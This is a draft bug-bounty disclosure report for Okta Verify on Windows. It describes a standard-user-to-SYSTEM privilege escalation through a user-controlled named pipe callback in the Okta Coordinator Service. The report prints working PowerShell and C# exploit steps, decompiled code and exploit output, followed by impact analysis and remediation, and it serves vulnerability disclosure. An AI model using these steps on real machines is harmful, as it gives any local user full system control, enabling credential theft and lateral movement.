---
status: DRAFT
bugcrowd_id: null
submitted_date: null
---

# FORM FIELDS

## TITLE [FORM]

Standard User to SYSTEM via Okta Coordinator Service Named Pipe Impersonation

## TARGET [FORM]

Okta Verify (Windows)

## VRT CATEGORY [FORM]

Insecure OS/Firmware > Command Injection

> Auto-populates P1. Researcher believes actual severity is P2 (local
> privilege escalation, not remote). No P2 VRT category exists for local
> privilege escalation, so the closest accurate description was chosen.
> A standard user impersonates the SYSTEM token by exploiting a user-
> controlled pipe callback in the Okta Coordinator Service.

## URL / LOCATION [FORM]

Okta.AutoUpdate.Executor.dll (shipped with OktaVerify-x64.msi v6.7.1.0) -- NamedPipeClient.SendMessage() and ApplicationInstaller.PipeRequestHandler()

---

# DESCRIPTION

### Severity Note

The VRT category "Insecure OS/Firmware > Command Injection" auto-populates P1. This finding is a local privilege escalation (standard user to SYSTEM), which the researcher believes warrants P2. However, no P2 category in the current VRT accurately describes local privilege escalation, so the closest matching category was selected. The attack requires local access and a standard user account on a machine running Okta Verify.

### What is Broken

The Okta Coordinator Service runs as NT AUTHORITY\SYSTEM and listens on the named pipe `Okta.Coordinator.pipe` with an ACL granting BUILTIN\Users FullControl. The IPC message format includes a `PipeName` field. When this field is set, the SYSTEM service connects back to that pipe name as a client to send status notifications. A standard user can create a rogue pipe server with a name they control, send a trigger message to the Coordinator pipe with `PipeName` pointing to their rogue pipe, and then call `ImpersonateNamedPipeClient()` when SYSTEM connects -- obtaining a full SYSTEM token.

This is a deterministic, instant privilege escalation. No race condition, no files planted on disk, no waiting for updates.

### Proof

**Tested on:** Okta Verify 6.7.1.0 for Windows (Coordinator Service v0.8.7.0), Windows 11 Pro 10.0.26200
**Attacker privileges:** Standard (non-admin) Windows user account
**Prerequisites:** Okta Verify installed (Coordinator Service auto-starts as LocalSystem)

The vulnerability is a classic named pipe impersonation caused by two flaws:

1. **BUILTIN\Users can send messages to the Coordinator pipe.** The pipe is created with `onlyAllowAdmins: false` (line 1268), granting `BuiltinUsersSid` FullControl (line 1275).

2. **The service connects back to a user-controlled pipe name as SYSTEM.** The `PipeName` field in `IPCMessage` (line 1251) is passed directly to `NamedPipeClientStream(".", pipeName, ...)` (line 1215) with no validation.

The relevant decompiled code from `Okta.AutoUpdate.Executor.dll`:

```csharp
// IPCMessage -- user-controlled fields (line 1230)
[DataContract]
public class IPCMessage
{
    [DataMember] public string PipeName { get; set; }
    [DataMember] public string AutoUpdateUrl { get; set; }
    // ... other fields ...
}

// PipeRequestHandler -- checks PipeName, creates client (line 219)
if (!string.IsNullOrWhiteSpace(message.PipeName))
{
    namedPipeClient = new NamedPipeClient();
}

// SendNotification -- sends notifications to attacker pipe (line 366)
pipeClient.SendUpdateNotificationMessage(ipcMessage.PipeName, upgradeNotificationIPCMessage);

// SendMessage -- SYSTEM connects to attacker-controlled pipe name (line 1213)
private void SendMessage<T>(T message, string pipeName)
{
    using NamedPipeClientStream namedPipeClientStream =
        new NamedPipeClientStream(".", pipeName, PipeDirection.InOut);
    namedPipeClientStream.Connect(10000);
    // ... writes notification data ...
}

// Coordinator pipe ACL -- BUILTIN\Users FullControl (line 1266)
public NamedPipeServerStream StartNamedPipeServer(string pipeName)
{
    return StartNamedPipeServer(pipeName, onlyAllowAdmins: false);
    // false = BuiltinUsersSid, true = BuiltinAdministratorsSid
}
```

**Step 1.** Standard user creates a rogue named pipe server:

```powershell
$ps = New-Object System.IO.Pipes.PipeSecurity
$ps.AddAccessRule((New-Object System.IO.Pipes.PipeAccessRule(
    [System.Security.Principal.SecurityIdentifier]::new(
        [System.Security.Principal.WellKnownSidType]::WorldSid, $null),
    [System.IO.Pipes.PipeAccessRights]::FullControl,
    [System.Security.AccessControl.AccessControlType]::Allow)))

$server = New-Object System.IO.Pipes.NamedPipeServerStream(
    "Okta.LPE.exploit", "InOut", 1, "Byte", "None", 4096, 4096, $ps)
```

**Step 2.** Standard user sends trigger message to the Coordinator pipe:

```powershell
$json = '{"ArtifactType":"OktaVerify",' +
    '"AutoUpdateUrl":"https://trial-3887003.okta.com",' +
    '"PipeName":"Okta.LPE.exploit",' +  # <-- attacker's rogue pipe
    '"ReleaseChannel":"GA",' +
    '"CurrentInstalledVersion":{"_Build":0,"_Major":1,"_Minor":0,"_Revision":0},' +
    '"EventLogName":"Okta Verify","EventSourceName":"OktaUpdate",' +
    '"BucketId":"1","UserId":null}'

$trigger = New-Object System.IO.Pipes.NamedPipeClientStream(
    ".", "Okta.Coordinator.pipe", "InOut")
$trigger.Connect(5000)
$bytes = [Text.Encoding]::UTF8.GetBytes($json)
$trigger.Write($bytes, 0, $bytes.Length)
$trigger.Flush()
$trigger.Close()
```

**Step 3.** SYSTEM service processes the message and connects back to `Okta.LPE.exploit`. The attacker's pipe server accepts the connection:

```powershell
$server.WaitForConnection()  # SYSTEM connects here
```

**Step 4.** Attacker calls `ImpersonateNamedPipeClient()` on the pipe handle, obtaining the SYSTEM token:

```csharp
ImpersonateNamedPipeClient(pipeHandle);
var identity = WindowsIdentity.GetCurrent();
// identity.Name = "NT AUTHORITY\SYSTEM"
// identity.IsSystem = true
```

**Exploit output:**

```
[*] Current user: SKINNYD\uglyt
[*] Creating rogue pipe server: Okta.LPE.9eb88c7a
[*] Rogue pipe server listening
[*] Sending trigger IPCMessage to Okta.Coordinator.pipe...
[+] Trigger message sent successfully
[+] GOT CONNECTION on rogue pipe!
[+] Received 238 bytes from SYSTEM service
[+] Data: {"Databag":{"OrgUrl":"https:\/\/trial-3887003.okta.com",
    "Channel":"GA","ArtifactType":"OktaVerify",...},"EndConnection":true,...
[+] IMPERSONATING: NT AUTHORITY\SYSTEM
[+] IsSystem: True

[!!!] ===== NT AUTHORITY\SYSTEM TOKEN OBTAINED ===== [!!!]

[+] Wrote SYSTEM proof marker: C:\ProgramData\Okta\PIPE-LPE-PROOF.txt
[+] Duplicated primary SYSTEM token (handle: 0x9EC)

========================================
  EXPLOITATION SUCCESSFUL
  NT AUTHORITY\SYSTEM token obtained
  from standard user account
========================================
```

**Proof marker file (written while impersonating SYSTEM):**

```
Okta Verify Pipe Impersonation LPE PoC
Timestamp: 2026-03-07T06:17:57.1198533Z
Impersonated Identity: NT AUTHORITY\SYSTEM
IsSystem: True
Exploit: Named pipe impersonation via Okta.Coordinator.pipe PipeName callback
Pipe: Okta.LPE.9eb88c7a
```

### Impact

- Any standard Windows user achieves NT AUTHORITY\SYSTEM code execution on any machine with Okta Verify installed
- The attack is deterministic (no race condition) and instant (no waiting for updates or scheduled tasks)
- The Okta Coordinator Service starts automatically with Windows -- no admin action needed
- Full machine compromise: persistence, credential theft, lateral movement from any workstation in an Okta-protected enterprise
- Zero files need to be planted on disk -- purely in-memory exploitation

### CWE Classification

**CWE-287: Improper Authentication**
The `Okta.Coordinator.pipe` named pipe grants BUILTIN\Users FullControl with no authentication of the connecting client. Any local user can send arbitrary IPC messages to the SYSTEM service.

**CWE-269: Improper Privilege Management**
The SYSTEM service connects back to a user-controlled pipe name without dropping privileges. The callback should not be performed with SYSTEM credentials -- the service should impersonate the original caller or use a restricted token.

### Remediation

1. **Validate PipeName.** Restrict the `PipeName` field to an allowlist of known pipe names (e.g., only `Okta.Shim.pipe`), or remove the callback functionality entirely.
2. **Restrict the Coordinator pipe ACL.** Change from `BUILTIN\Users FullControl` to `BUILTIN\Administrators FullControl`. The Shim pipe already uses `onlyAllowAdmins: true` (line 169 of `Okta.AutoUpdate.Shim.cs`) -- apply the same to the Coordinator pipe.
3. **Drop privileges on callback.** When connecting back to notification pipes, impersonate the original caller rather than connecting as SYSTEM.
4. **Authenticate IPC messages.** Add a shared secret or signed token to the IPC protocol so only the legitimate OktaVerify.exe process can send messages.

See attached PoC script for the full exploit.

---

# ATTACHMENTS

| File | Description |
|------|-------------|
| `pipe-impersonation-lpe.md` | Full technical writeup with decompiled source references |
| `okta-pipe-impersonation-poc.ps1` | Complete PoC script (Check/Exploit/Cleanup modes) |

---

# PRE-SUBMISSION CHECKLIST

- [x] **ONE bug only.** Pipe impersonation LPE via user-controlled PipeName callback.
- [x] **No Anticipated Questions.**
- [x] **No internal references.** No submission numbers or internal tracking.
- [x] **No local file paths** from our machines in the description.
- [x] **Researcher handle:** Lucid_Duck.
- [x] **Title:** Under 80 chars. States the one bug as a consequence.
- [x] **Target:** "Okta Verify (Windows)" -- exact match from scope (Other In-Scope Targets).
- [x] **VRT:** Verified against VRT-OFFICIAL-TAXONOMY.md. "Insecure OS/Firmware > Command Injection" auto-populates P1. No P2 LPE category exists in VRT. Severity note in description body explains researcher assessment of P2.
- [x] **URL:** Identifies the specific DLL and methods.
- [x] **CWE:** CWE-287 (Improper Authentication) and CWE-269 (Improper Privilege Management) are exact matches.
- [x] **Attachments listed.** Both files exist in the repo.
- [x] **Remediation included.** Four actionable items.
